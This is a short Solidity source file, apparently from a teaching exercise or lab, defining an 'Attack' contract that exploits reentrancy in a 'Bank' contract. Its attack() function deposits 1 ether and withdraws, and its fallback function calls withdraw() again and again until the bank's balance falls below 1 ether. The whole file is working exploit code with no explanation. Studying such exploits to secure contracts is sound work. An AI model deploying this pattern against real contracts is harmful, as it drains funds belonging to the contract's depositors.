// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Bank} from "./Bank.sol";

contract Attack {
    Bank public bank;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}